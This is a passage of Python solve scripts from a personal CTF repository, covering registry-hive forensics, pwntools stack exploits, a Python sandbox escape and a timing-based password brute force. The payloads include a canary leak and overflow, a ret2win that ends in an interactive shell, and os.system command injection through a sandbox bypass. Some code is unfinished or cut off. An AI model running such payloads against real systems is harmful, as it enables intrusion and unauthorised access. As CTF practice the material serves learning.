        class_file_offset = class_offset + 0x1000

        # 4) at that position we find another registry cell  grab its whole body
        cell_size = struct.unpack_from(&#34;&lt;i&#34;, data, class_file_offset)[0]
        cell_len = abs(cell_size)  # value is stored as negative
        cell_blob = data[class_file_offset : class_file_offset + cell_len]

        # 5) build the flag
        return f&#34;ECSC{{{cell_blob.hex().upper()}}}&#34;

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def get_functions(self, variable):
        &#34;&#34;&#34;
        Get all functions of a variable
        &#34;&#34;&#34;
        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func)) and not func.startswith(&#34;__&#34;)
        ]

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def hive_solution(self):
        self.hive = RegistryHive(self.challenge_file)
        security_answers = []
        users_base = r&#34;\SAM\Domains\Account\Users&#34;
        users_key = self.hive.get_key(users_base)
        # print(hive)

        # Get all functions of the hive object
        hive_functions = self.get_functions(self.hive)

        # print(&#34;Hive Functions:&#34;, hive_functions)
        users_key_functions = self.get_functions(users_key)

        # Get the name for each user from subkey.name

        user_key = &#34;000003E9&#34;  # print(&#34;Users Key Functions:&#34;, users_key_functions)

        user_subkeys = users_key.get_subkey(user_key)
        # print(&#34;User Subkeys:&#34;, user_subkeys.get_value(&#34;&#34;))

        # value_v = user_subkeys.get_value(&#34;V&#34;)
        value_reset = user_subkeys.get_value(&#34;ResetData&#34;)
        # value_force = user_subkeys.get_value(&#34;ForcePasswordReset&#34;)

        # decoded_value_v = self._decode_v_value(value_v)
        decoded_value_reset = self._decode_v_value(value_reset)
        # decoded_value_force = self._decode_v_value(value_force)

        # print(&#34;Decoded V Value:&#34;, decoded_value_v)
        # print(&#34;Decoded Reset Value:&#34;, decoded_value_reset)
        # print(&#34;Decoded Force Value:&#34;, decoded_value_force)

        # print(decoded_value_reset)

        # Join the list into a single string and parse it as JSON
        decoded_json = json.loads(&#34;&#34;.join(decoded_value_reset))
        flag = f&#34;ECSC{{{&#39;:&#39;.join([item[&#34;answer&#34;] for item in  decoded_json[&#34;questions&#34;]])}}}&#34;
        # answers = [item[&#34;answer&#34;] for item in decoded_value_reset.get()]
        print(flag)

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def look_all_subkeys(self):
        # Unused
        security_answers = []
        users_base = r&#34;\SAM\Domains\Account\Users&#34;
        users_key = self.hive.get_key(users_base)

        for subkey in users_key.iter_subkeys():

            # for subkey in users_key.subkeys_list:
            if subkey.name == &#34;Names&#34;:
                continue  # Skip the Names key

            try:

                print(subkey.name, subkey.values_count, list(subkey.iter_values()))
                v_value = subkey.get_value(&#34;V&#34;)
                # print(f&#34;Value for {subkey.name}: {v_value}&#34;)
                decoded = self._decode_v_value(v_value)
                if decoded:
                    security_answers.extend(decoded)
            except Exception as e:
                print(e)
                continue

        print(security_answers)
        # Only keep unique and plausible answers (e.g. non-binary junk)
        cleaned = [a for a in security_answers if a and a.isprintable()]
        cleaned = list(dict.fromkeys(cleaned))  # remove duplicates

        return
        # Format answer according to challenge
        result = f&#34;ECSC{{{&#39;:&#39;.join(cleaned[:3])}}}&#34;
        print(result)
        self.flag = result

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def _decode_v_value(self, value_bytes):
        try:
            # Decode as UTF-16LE (standard for registry)
            text = value_bytes.decode(&#34;utf-16le&#34;, errors=&#34;ignore&#34;)
            # Extract readable strings
            candidates = re.findall(r&#34;[\x20-\x7e]{3,}&#34;, text)
            # print(candidates)
            return candidates

            def is_valid(s):
                if len(s) &gt; 30 or len(s) &lt; 3:
                    return False
                if re.fullmatch(r&#34;[0-9a-fA-F]{6,}&#34;, s):  # ignore hashes
                    return False
                if sum(c.isalpha() for c in s) &lt; 2:
                    return False
                return True

            return [c for c in candidates if is_valid(c)]

        except Exception as e:
            print(f&#34;Decoding error: {e}&#34;)
            return []

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def main(self):
        self.hive_solution()

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def _discover_offset(self, nk):
        &#34;&#34;&#34;
        Try every attribute name that regipy has ever used for the cell offset.
        If none work, fall back to a regex scan in the raw hive buffer.
        &#34;&#34;&#34;
        CANDIDATE_ATTRS = (
            &#34;offset&#34;,
            &#34;_offset&#34;,  # early regipy
            &#34;absolute_offset&#34;,
            &#34;_absolute_offset&#34;,
            &#34;header_offset&#34;,
            &#34;_header_offset&#34;,
            &#34;raw_data_offset&#34;,
            &#34;_raw_data_offset&#34;,
        )

        for attr in CANDIDATE_ATTRS:
            try:
                off = getattr(nk, attr)
                if isinstance(off, int):
                    return off
            except AttributeError:
                # Attribute existed as a @property but its backing field is gone
                continue

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def get_functions(self, variable, under=False):
        &#34;&#34;&#34;
        Get all functions of a variable
        &#34;&#34;&#34;

        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func))
            and (under or not (func.startswith(&#34;__&#34;)))
        ]

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def get_attributes(self, variable):
        &#34;&#34;&#34;
        Get all attributes of a variable
        &#34;&#34;&#34;

        return [
            attr
            for attr in dir(variable)
            if not callable(getattr(variable, attr)) and not (attr.startswith(&#34;__&#34;))
        ]

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def skew_get_value(self):
        self.hive = RegistryHive(self.challenge_file)

        with open(self.challenge_file, &#34;rb&#34;) as f:
            self.hive_data = f.read()

        # print(self.get_functions(self.hive))
        # control_set = self.hive.get_key(r&#34;ControlSet001&#34;)
        skew1_key = self.hive.get_key(r&#34;\ControlSet001\Control\Lsa\Skew1&#34;)
        print(self.get_functions(skew1_key))
        # print(self.get_attributes(skew1_key))
        # cell_offset = self._discover_offset(skew1_key)
        # print(f&#34;Offset of Skew1 key: {cell_offset}&#34;)

        for i in skew1_key.iter_values():
            print(i.name, i.value)
            if i.name == &#34;SkewMatrix&#34;:
                return i.value

        return None

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def attempt_for_loop_subkeys(self):
        skew1_key = self.hive.get_key(r&#34;\ControlSet001\Control\Lsa&#34;)

        for subkey in skew1_key.iter_subkeys():
            # print(f&#34;Subkey: {subkey.name}, &#34;)
            if subkey.name == &#34;Skew1&#34;:
                # print(f&#34;Found Skew1 subkey: {subkey.name}&#34;)
                # for subvalue in subkey.iter_values
                print(self.get_functions(subkey))
                # print(self.get_attributes(subkey))
                print(dir(subkey))
                # skew1_subkey = subkey._parse_subkeys()
                # print(f&#34;Skew1 Subkey: {skew1_subkey}&#34;)
                for sub_subkey in subkey.iter_subkeys():
                    print(
                        f&#34;Sub-subkey: {sub_subkey.name}, Offset: {sub_subkey._offset}&#34;
                    )

                print(f&#34;Values - {subkey.name}:&#34;)
                for value in subkey.iter_values():
                    print(f&#34;  Value Name: {value.name}, Value Data: {value.value}&#34;)
                for sub_subkey in subkey.iter_subkeys():
                    print(
                        f&#34;Sub-subkey: {sub_subkey.name}, Offset: {sub_subkey._offset}&#34;
                    )

        # Using this to get all the subkeys
        # for i in skew1_key.iter_subkeys():
        #     print(i.name, i.value.)

        # for i in skew1_key.iter_values():
        #     if i.name == &#34;SkewMatrix&#34;:
        #         print(&#34;Found SkewMatrix value:&#34;)
        #         return i.value
        #     print(i.name, i.value)

        # class_name = skew1_key.header.class_name
        # print(f&#34;Class Name: {class_name}&#34;)
        # values = skew1_key.values()
        # print(f&#34;Values: {values}&#34;)

        # print(control_set.read_value())
        # print(control_set.get_class_name())

        # skew1 = self.hive.open(&#34;ControlSet001\\Control\\Lsa\\Skew1&#34;)

        # offset =
        return

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def get_cell_size(self):
        reg = Registry.Registry(self.challenge_file)
        print(self.get_functions(reg, under=False))

        lsa_key = reg.open(r&#34;ControlSet001&#34;)
        print(self.get_functions(lsa_key))

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def recover_skew1_cell_hex(self, cell_size, cell_data):
        &#34;&#34;&#34;
        Recover the Skew1 part of the Windows BootKey as a continuous hex string.

        Args:
            cell_size (int): The size of the registry cell (including size bytes and data).
            cell_data (bytes): The raw bytes of the cell data including the Skew1 Class Name/Attribute.

        Returns:
            str: The continuous hex string in the format ECSC{...}
        &#34;&#34;&#34;
        # Convert cell size to 4 bytes, little-endian
        size_bytes = cell_size.to_bytes(4, byteorder=&#34;little&#34;)
        # Concatenate size and data
        full_cell = size_bytes + cell_data
        # Convert to uppercase hex string
        hex_string = full_cell.hex().upper()
        # Format as flag
        return hex_string

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def main(self):
        # self.get_cell_size()
        result = self.skew_get_value()

        self.attempt_for_loop_subkeys()

        # /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def get_functions(self, variable):
        &#34;&#34;&#34;
        Get all functions of a variable
        &#34;&#34;&#34;
        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func)) and not func.startswith(&#34;__&#34;)
        ]

        # /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def hive_solution(self):
        self.hive = RegistryHive(self.challenge_file)
        security_answers = []
        users_base = r&#34;\SAM\Domains\Account\Users&#34;
        users_key = self.hive.get_key(users_base)
        # print(hive)

        # Get all functions of the hive object
        hive_functions = self.get_functions(self.hive)

        # print(&#34;Hive Functions:&#34;, hive_functions)
        users_key_functions = self.get_functions(users_key)

        # Get the name for each user from subkey.name

        user_key = &#34;000003E9&#34;  # print(&#34;Users Key Functions:&#34;, users_key_functions)

        user_subkeys = users_key.get_subkey(user_key)
        # print(&#34;User Subkeys:&#34;, user_subkeys.get_value(&#34;&#34;))

        # value_v = user_subkeys.get_value(&#34;V&#34;)
        value_reset = user_subkeys.get_value(&#34;ResetData&#34;)
        # value_force = user_subkeys.get_value(&#34;ForcePasswordReset&#34;)

        # decoded_value_v = self._decode_v_value(value_v)
        decoded_value_reset = self._decode_v_value(value_reset)
        # decoded_value_force = self._decode_v_value(value_force)

        # print(&#34;Decoded V Value:&#34;, decoded_value_v)
        # print(&#34;Decoded Reset Value:&#34;, decoded_value_reset)
        # print(&#34;Decoded Force Value:&#34;, decoded_value_force)

        # print(decoded_value_reset)

        # Join the list into a single string and parse it as JSON
        decoded_json = json.loads(&#34;&#34;.join(decoded_value_reset))
        flag = f&#34;ECSC{{{&#39;:&#39;.join([item[&#34;answer&#34;] for item in  decoded_json[&#34;questions&#34;]])}}}&#34;
        # answers = [item[&#34;answer&#34;] for item in decoded_value_reset.get()]
        print(flag)

        # /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def look_all_subkeys(self):
        # Unused
        security_answers = []
        users_base = r&#34;\SAM\Domains\Account\Users&#34;
        users_key = self.hive.get_key(users_base)

        for subkey in users_key.iter_subkeys():

            # for subkey in users_key.subkeys_list:
            if subkey.name == &#34;Names&#34;:
                continue  # Skip the Names key

            try:

                print(subkey.name, subkey.values_count, list(subkey.iter_values()))
                v_value = subkey.get_value(&#34;V&#34;)
                # print(f&#34;Value for {subkey.name}: {v_value}&#34;)
                decoded = self._decode_v_value(v_value)
                if decoded:
                    security_answers.extend(decoded)
            except Exception as e:
                print(e)
                continue

        print(security_answers)
        # Only keep unique and plausible answers (e.g. non-binary junk)
        cleaned = [a for a in security_answers if a and a.isprintable()]
        cleaned = list(dict.fromkeys(cleaned))  # remove duplicates

        return
        # Format answer according to challenge
        result = f&#34;ECSC{{{&#39;:&#39;.join(cleaned[:3])}}}&#34;
        print(result)
        self.flag = result

        # /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def _decode_v_value(self, value_bytes):
        try:
            # Decode as UTF-16LE (standard for registry)
            text = value_bytes.decode(&#34;utf-16le&#34;, errors=&#34;ignore&#34;)
            # Extract readable strings
            candidates = re.findall(r&#34;[\x20-\x7e]{3,}&#34;, text)
            # print(candidates)
            return candidates

            def is_valid(s):
                if len(s) &gt; 30 or len(s) &lt; 3:
                    return False
                if re.fullmatch(r&#34;[0-9a-fA-F]{6,}&#34;, s):  # ignore hashes
                    return False
                if sum(c.isalpha() for c in s) &lt; 2:
                    return False
                return True

            return [c for c in candidates if is_valid(c)]

        except Exception as e:
            print(f&#34;Decoding error: {e}&#34;)
            return []

        # /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def main(self):
        self.hive_solution()

        # /home/figaro/CTF/Categories/Pwn/HTB/El_Pipo/payloads/solution.py
    def custom_init(self):
        self.folder_files = self.Path(self.folder_files, &#34;challenge&#34;)
        self.library = self.Path(self.folder_files, &#34;glibc&#34;)
        self.challenge_file = self.Path(self.folder_files, self.file)

        self.pwn.context.binary = self.Path(self.challenge_file)

        self.env = {&#34;LD_PRELOAD&#34;: self.library.as_posix()}

        # /home/figaro/CTF/Categories/Pwn/HTB/El_Pipo/payloads/solution.py
    def connect(self, *args, **kwargs) -&gt; None:
        # return super().initiate_connection()
        self.conn = self.pwn.process(self.challenge_file.as_posix(), env=self.env)

        # /home/figaro/CTF/Categories/Pwn/HTB/El_Pipo/payloads/solution.py
    def main(self):
        self.custom_init()
        self.initiate_connection()

        # self.recv_menu(display=True)
        payload = &#34;a&#34; * 31

        # self.send_menu(payload, display=True)

        self.conn.sendline(payload.encode())

        # /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def __init__(self, conn, file, url, port):
        super().__init__(conn=conn, file=file, url=url, port=port)

        self.pwn.context.binary = self.binary = self.pwn.ELF(
            self.challenge_file, checksec=True
        )

        self.libc_path = self.Path(self.folder_files, &#34;glibc&#34;, &#34;libc.so.6&#34;)
        self.ld_path = self.Path(self.folder_files, &#34;glibc&#34;, &#34;ld-linux-x86-64.so.2&#34;)

        self.env = {&#34;LD_PRELOAD&#34;: str(self.libc_path), &#34;LD&#34;: str(self.ld_path)}

        # /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def connect(self, *args, **kwargs) -&gt; None:
        if self.conn_type == &#34;remote&#34; and self.url and self.port:
            self.conn = self.pwn.remote(self.url, self.port)
        elif self.conn_type == &#34;local&#34; and self.file:
            self.conn = self.pwn.process(
                [str(self.ld_path), str(self.challenge_file)], env=self.env
            )

        # /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def interacting_with_binary(self):

        self.initiate_connection()

        initial_menu = &#34;[*] Initializing components...\n&#34;

        # self.recv_menu(number=10, display=True)
        output = self.conn.recvuntil(initial_menu)
        print(output)

        # /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def main(self):

        self.interacting_with_binary()

        # /home/figaro/CTF/Categories/Pwn/HTB/Quack_Quack/payloads/solution.py
    def main(self):
        self.initiate_connection()

        menu_text = &#34;&gt; &#34;
        payload = &#34;Quack Quack &#34;
        payload += &#34;%p. &#34; * 40
        print(payload)
        self.recv_send(text_until=menu_text, text=payload, lines=34)

        result = self.recv_lines(number=4, display=True, save=True)

        # This is not yet complete, but it is a good start
        canary = result[0].split(&#34;.&#34;)[1]
        canary = int(canary, 16)
        print(f&#34;Canary: {hex(canary)}&#34;)
        # Step 2: Craft Overflow Payload
        payload = b&#34;A&#34; * 32  # Fill `buf`
        payload += self.pwn.p64(canary)  # Bypass stack canary
        payload += b&#34;B&#34; * 8  # Overwrite saved RBP
        payload += p64(
            0xDEADBEEF
        )

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def setup(self):
        self.elf = self.pwn.context.binary = self.pwn.ELF(self.challenge_file)
        self.pwn.context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def get_elf_function_address(self, function):
        &#34;&#34;&#34;
        Description:
        &#34;&#34;&#34;
        if self.elf is None:
            self.elf = self.pwn.ELF(self.challenge_file)

        return self.elf.symbols[function]

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def challenge_get_offset_address(self, function1, function2):
        offset = self.get_elf_function_address(
            function1
        ) - self.get_elf_function_address(function2)
        return offset

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def main(self):
        # self.elf = None
        self.setup()
        self.initiate_connection()
        # main_offset = self.challenge_get_offset_address(&#34;main&#34;, &#34;emergency_broadcast&#34;)
        emergency_broadcast_addr = self.get_elf_function_address(&#34;emergency_broadcast&#34;)
        print(f&#34;Emergency Broadcast Address: {hex(emergency_broadcast_addr)}&#34;)
        payload1 = b&#34;A&#34; * 8
        print(payload1)
        payload2 = b&#34;B&#34; * 0x18 + self.pwn.p64(emergency_broadcast_addr)
        print(payload2)

        # self.recv_lines(2, display=True)
        log_entry_text = &#34;Enter log entry: &#34;
        # self.recv_until(log_entry_text)
        # self.send(payload1)
        self.recv_send(text_until=log_entry_text, lines=2, text=payload1, display=True)

        data_entry_text = &#34;Enter data: &#34;
        # print(self.recv_until(data_entry_text))
        # self.send(payload2)
        self.recv_send(text_until=data_entry_text, text=payload2, display=True)

        # time.sleep(0.5)
        # self.recv_lines(2, display=True)

        self.conn.interactive()

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/attempt_01.py
    def get_elf_function_address(self, function):
        &#34;&#34;&#34;
        Description:
        &#34;&#34;&#34;
        if self.elf is None:
            self.elf = self.pwn.ELF(self.challenge_file)

        return self.elf.symbols[function]

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/attempt_01.py
    def challenge_get_offset_address(self, function1, function2):
        offset = self.get_elf_function_address(
            function1
        ) - self.get_elf_function_address(function2)
        return offset

        # /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/attempt_01.py
    def main(self):
        self.initiate_connection()
        self.elf = None
        # main_offset = self.challenge_get_offset_address(&#34;main&#34;, &#34;emergency_broadcast&#34;)
        emergency_broadcast_addr = self.get_elf_function_address(&#34;emergency_broadcast&#34;)
        payload1 = b&#34;A&#34; * 24
        # + b&#34;\x91&#34;
        print(payload1)
        payload2 = b&#34;B&#34; * 24 + self.pwn.p64(emergency_broadcast_addr)
        print(payload2)
        self.recv_lines(2)
        log_entry_text = &#34;Enter log entry: &#34;
        self.recv_until(log_entry_text)
        self.send(payload1)
        data_entry_text = &#34;Enter data: &#34;
        self.recv_until(data_entry_text)
        self.send(payload2)
        self.conn.interactive()

        # /home/figaro/CTF/Categories/Miscellaneous/Reply/Flagsembler/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Miscellaneous/plaidctf/Hangman/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def rot_bruteforce(self, crypted_text, known_text, max_shift=94):
        &#34;&#34;&#34;
        Brute forces ROT47 shifts to find the one that contains the known text.

        Args:
            crypted_text (str): The encrypted text.
            known_text (str): The known plaintext to look for.
            max_shift (int): The maximum shift to attempt (ROT47 has 94 shifts).

        Returns:
            int: The shift that contains the known text, or -1 if not found.
        &#34;&#34;&#34;
        for shift in range(1, max_shift):
            decrypted_text = self.rot(crypted_text, shift)
            if known_text.lower() in decrypted_text.lower():
                return shift
        return -1

        # /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def rot(self, text, shift):
        &#34;&#34;&#34;
        Applies the ROT47 cipher to the given text with the specified shift.

        Args:
            text (str): The input text.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The transformed text.
        &#34;&#34;&#34;
        return &#34;&#34;.join([self.rot_char(c, shift) for c in text])

        # /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def rot_char(self, c, shift):
        &#34;&#34;&#34;
        Rotates a single character using the ROT47 cipher.

        Args:
            c (str): The input character.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The rotated character.
        &#34;&#34;&#34;
        ascii_code = ord(c)
        if 33 &lt;= ascii_code &lt;= 126:  # ROT47 only affects printable ASCII
            return chr((ascii_code - 33 + shift) % 94 + 33)
        return c

        # /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def main(self):
        hexing = &#34;6a0077002d0032002c0054003d006400420071004e004700250053002800680064004f007800490046002000780044004c00710058002600530038006e004f003b004c0022002400670064002100500060005d0055003d006c0027003000290069002e004d002500660071004c005400710077006e0037005600330031003a003e006d004d0033006d0070006c003c005600500034003b0045003d003d007a0071005f004c0067006d004a005b0049002e00410056002b0076003d0060007a004b002c005b007a005f002000380039005e006d00230074005e002200680040002d006e0079002e00370066002e005300&#34;
        result = &#34;&#34;
        for i in range(0, len(hexing), 2):
            # print(hexing[i : i + 2])
            if hexing[i : i + 2] == &#34;00&#34;:
                result += &#34; &#34;
            else:
                result += hexing[i : i + 2]
        print(result)

        decoded = bytes.fromhex(hexing).decode(&#34;utf-16&#34;)
        print(decoded)
        partial = &#34;}&#34;
        shift = self.rot_bruteforce(decoded, partial)
        print(f&#34;Shift: {shift}&#34;)
        print(f&#34;Decoded: {self.rot(decoded, shift)}&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/solution.py
    def main(self):
        selections = [
            &#34;3_0&#34;,
            &#34;1_2&#34;,
            &#34;3_2&#34;,
            &#34;1_1&#34;,
            &#34;5_0&#34;,
            &#34;0_0&#34;,
            &#34;2_0&#34;,
            &#34;1_0&#34;,
            &#34;3_1&#34;,
            &#34;5_2&#34;,
            &#34;5_1&#34;,
            &#34;6_0&#34;,
            &#34;6_1&#34;,
            &#34;3_3&#34;,
            &#34;2_1&#34;,
            &#34;2_2&#34;,
            &#34;0_1&#34;,
        ]
        seldir = {
            0: {0: 123, 1: 125},
            1: {0: 80, 1: 67, 2: 72},
            2: {0: 80, 1: 101, 2: 82},
            3: {0: 78, 1: 84, 2: 52, 3: 84},
            5: {0: 75, 1: 109, 2: 88},
            6: {0: 52, 1: 53},
        }

        flag = &#34;&#34;
        for s in selections:
            nums = [int(i) for i in s.split(&#34;_&#34;)]
            flag += chr(seldir[nums[0]][nums[1]])
        print(flag)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/solution.py
    def verify_js_reconstructed(self):
        self.challenge_file = self.Path(self.folder_data, &#34;chall_edited.pptx&#34;)
        self.try_catch(self.run)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/verify.py
    def main(self):
        self.challenge_file = self.Path(self.folder_data, &#34;chall_edited.pptx&#34;)
        self.try_catch(self.run)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/verify.py
    def run(self):
        selections = [
            &#34;3_0&#34;,
            &#34;1_2&#34;,
            &#34;3_2&#34;,
            &#34;1_1&#34;,
            &#34;5_0&#34;,
            &#34;0_0&#34;,
            &#34;2_0&#34;,
            &#34;1_0&#34;,
            &#34;3_1&#34;,
            &#34;5_2&#34;,
            &#34;5_1&#34;,
            &#34;6_0&#34;,
            &#34;6_1&#34;,
            &#34;3_3&#34;,
            &#34;2_1&#34;,
            &#34;2_2&#34;,
            &#34;0_1&#34;,
        ]

        prs = Presentation(self.challenge_file)
        correct = True

        for selection in selections:
            slide_index = int(selection[0])
            shape_index = 1 if selection[0] != &#34;0&#34; else 0
            text_index = int(selection[2])

            slide = prs.slides[slide_index]
            shape = slide.shapes[shape_index]
            text = shape.text

            if slide_index == 0:
                if text_index == 0 and text[0] != chr(123):
                    correct = False
                elif text_index == 1 and text[23] != chr(125):
                    correct = False
            elif slide_index == 1:
                if text_index == 0 and text[41] != chr(80):
                    correct = False
                elif text_index == 1 and text[138] != chr(67):
                    correct = False
                elif text_index == 2 and text[184] != chr(72):
                    correct = False
            elif slide_index == 2:
                if text_index == 0 and text[0] != chr(80):
                    correct = False
                elif text_index == 1 and text[83] != chr(101):
                    correct = False
                elif text_index == 2 and text[179] != chr(82):
                    correct = False
            elif slide_index == 3:
                if text_index == 0 and text[25] != chr(78):
                    correct = False
                elif text_index == 1 and text[26] != chr(84):
                    correct = False
                elif text_index == 2 and text[28] != chr(52):
                    correct = False
                elif text_index == 3 and text[84] != chr(84):
                    correct = False
            elif slide_index == 5:
                if text_index == 0 and text[105] != chr(75):
                    correct = False
                elif text_index == 1 and text[106] != chr(109):
                    correct = False
                elif text_index == 2 and text[219] != chr(88):
                    correct = False
            elif slide_index == 6:
                if text_index == 0 and text[52] != chr(52):
                    correct = False
                elif text_index == 1 and text[95] != chr(53):
                    correct = False

        if correct:
            print(&#34;Thanx for helping me out, now go input the flag&#34;)
        else:
            print(&#34;I don&#39;t think i had that in mind&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/verify.py
    def try_catch(self, callback):
        try:
            callback()
        except Exception as error:
            print(error)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/Snekbox/payloads/solution.py
    def main(self):
        self.challenge_file = self.folfil(&#34;data&#34;, &#34;edited_server.py&#34;)
        self.initiate_connection()
        self.menu_text = &#34;&gt; &#34;
        self.menu_num = 0

        payload = &#39;globals().get(&#34;unsafe&#34; + globals()[&#34;BLACKLIST&#34;][6] + globals()[&#34;BLACKLIST&#34;][9])()&#39;
        self.send_menu(choice=payload)

        payload = &#34;&#34;&#34;__import__(&#39;os&#39;).system(&#34;cat flag*&#34;)&#34;&#34;&#34;
        # payload = &#34;&#34;&#34;print(&#34;THis is working &#34; )&#34;&#34;&#34;
        self.send_menu(choice=payload)
        self.recv_lines(number=1, display=True)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def main(self):
        # self.initiate_connection()
        # self.exploitation()
        self.flouri_min = self.random_flouri_generator(number=1)
        self.flouri_max = self.random_flouri_generator(number=10**30)

        # self.recv_menu(number=2, save=True)
        # self.send_menu()

        self.brute_force()

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def test_letter(self, password):
        alphabet = string.ascii_letters + string.digits + string.punctuation

        results = []

        for i in alphabet:
            connector = CTFSolver(
                conn=self.conn_type, file=self.file, url=self.url, port=self.port
            )

            connector.menu_text = &#34;Give me password and number in json: &#34;
            connector.menu_num = 0

            connector.initiate_connection()
            connector.recv_lines(number=2, display=False)
            start_time = time.time()
            connector.send_menu(
                self.payload_maker(password + i, self.flouri_min), display=False
            )
            response = connector.recv_lines(number=1, save=True)

            connector.conn.close()

            end_time = time.time()

            results.append((i, end_time - start_time))

        results = sorted(results, key=lambda x: x[1])

        return results

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def brute_force(self):
        password = &#34;&#34;
        for _ in range(60):
            results = self.test_letter(password)
            print(results)
            password += results[0][0]
            print(password)

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def random_flouri_generator(self, number=None):
        m = 10**30

        if number:
            return (
                number**11
                + 17 * number**7
                - 42 * number**5
                + 1337 * number * 3
                + 31337 * number
            )

        return (
            random.randint(1, m) ** 11
            + 17 * random.randint(1, m) ** 7
            - 42 * random.randint(1, m) ** 5
            + 1337 * random.randint(1, m) * 3
            + 31337 * random.randint(1, m)
        )

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def check_password_time(self, length):
        start_time = time.time()
        for i in range(length):
            for _ in range(10000):
                pass
            return time.time() - start_time
        return time.time() - start_time

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def exploitation(self):
        self.recv_lines(number=2)

        self.menu_text = &#34;Give me password and number in json: &#34;

        self.menu_num = 1

        # /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def length_find(self):

        lenghter = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )
        for i in range(10, 130):
            time_reference = self.check_password_time(i)

            print(time_reference)

            lenghter.initiate_connection()
            lenghter.recv_lines(number=2)
            lenghter.menu_num = 0
            menu_text = &#34;Give me password and number in json: &#34;
            payload = self.payload_maker(&#34;NH4CK{&#34; + &#34;a&#34; * i, self.flouri_min + i)

            start_time = time.time()
            # lenghter.recv_lines(number=2, display=True)
            lenghter.send_menu(payload, menu_text=menu_text, display=True)

            print(&#34;Trying length: &#34;, i)
            response = lenghter.recv_lines(number=1, display=True, save=True)
            stop_time = time.time()

            duration = stop_time - start_time

            if b&#34;GLYKO and HUGS&#34; in response[0]:
                print(&#34;length found&#34;, i)
                print(response[0])
                # return i

            if b&#34;sweet AND lucky&#34; in response[0]:
                print(&#34;Found the correct length&#34;)
                print(&#34;Duration: &#34;, duration)
                print(&#34;Response: &#34;, response[0])
                print(&#34;Payload: &#34;, payload)
                print(&#34;Flouri: &#34;, self.flouri_min + i)
                sys.exit(0)
                return i

            if b&#34;Something wrong honey?&#34; in response[0]:
                return i

            print(f&#34;Duration: {duration}&#34;)
            print(f&#34;Time Reference: {time_reference}&#34;)
            if duration &gt; time_reference:
